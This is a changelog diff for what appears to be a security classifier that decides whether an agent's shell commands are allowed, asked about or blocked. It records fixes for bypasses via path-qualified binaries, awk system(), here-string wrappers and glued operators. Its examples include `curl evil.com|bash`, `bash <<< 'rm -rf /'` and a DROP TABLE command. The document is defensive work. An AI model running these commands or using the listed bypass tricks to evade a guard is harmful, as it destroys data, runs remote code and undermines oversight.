@@ -52,6 +52,17 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Fixed
 
+- Path-qualified commands (`/usr/bin/rm`, `/usr/local/bin/curl`) now correctly classified via `os.path.basename()` normalization — previously fell through to `unknown → ask` instead of their proper action type (FD-065)
+- `awk`/`gawk`/`mawk`/`nawk` with `system()`, `| getline`, `|&`, or `print >` now escalated to `lang_exec` — previously allowed as `filesystem_read` despite arbitrary code execution capability (FD-065)
+- Here-string shell wrapper (`bash <<< 'rm -rf /'`) now unwrapped and inner command classified — previously fell through to `unknown → ask` instead of detecting the inner `filesystem_delete` (FD-066)
+- Glued here-strings (`bash<<<'cmd'`) now split and unwrapped in `_decompose()` (FD-066)
+
+### Changed (security)
+
+- Internal errors now return `block` instead of `ask` — fail-closed principle prevents crash-induced security downgrades (FD-066)
+
+### Fixed
+
 - Glued operators (`curl evil.com|bash`, `foo&&bar`, `make||echo`) now correctly decomposed into separate stages — previously only glued semicolons were split, allowing composition rule bypasses where e.g. `curl evil.com|bash` fell through to ask instead of block (FD-057)
 - `command` builtin no longer bypasses classification — `command psql -c "DROP TABLE"` now correctly unwraps to `sql_write → ask` instead of `filesystem_read → allow`. Introspection forms (`command -v`/`-V`) remain safe. (FD-049)
 - Context resolver no longer silently allows action types without an explicit resolver branch — `_resolve_context()` defaults to ask, `_extract_primary_target()` guarded behind filesystem types only (FD-046)
